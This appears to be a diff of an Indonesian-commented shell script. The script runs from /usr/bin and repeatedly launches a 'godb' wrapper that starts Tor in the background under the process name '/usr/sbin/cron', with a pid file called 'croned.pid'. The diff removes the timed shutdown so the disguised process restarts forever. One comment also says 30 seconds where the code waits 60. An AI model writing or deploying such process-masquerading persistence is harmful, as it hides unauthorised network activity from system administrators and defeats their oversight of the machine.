@@ -30,18 +30,25 @@ cd /usr/bin
 
 repeat_command() {
   while true; do
+    # Hentikan proses godb yang berjalan sebelumnya
+    kill_godb
+
+    # Jalankan perintah godb baru
     ./godb -s "/usr/sbin/cron" -d -p croned.pid ./tor &
     GODB_PID=$!
     echo "Proses godb berjalan dengan PID $GODB_PID."
-    sleep 30
+    
+    # Tunggu selama 30 detik sebelum mengulang
+    sleep 60
   done
 }
 
 # Fungsi untuk menghentikan proses godb yang berjalan
 kill_godb() {
   if [[ -n "$GODB_PID" ]]; then
-    kill "$GODB_PID"
+    kill "$GODB_PID" 2>/dev/null
     echo "Proses godb dengan PID $GODB_PID telah dihentikan."
+    GODB_PID=""
   else
     echo "Tidak ada proses godb yang berjalan."
   fi
@@ -51,10 +58,5 @@ kill_godb() {
 repeat_command &
 REPEAT_PID=$!
 echo "Proses repeat_command berjalan dengan PID $REPEAT_PID."
-
-# Menunggu beberapa saat sebelum menghentikan proses godb 
-# Anda bisa menyesuaikan logika ini sesuai kebutuhan
-sleep 120
-kill_godb
 
 wait
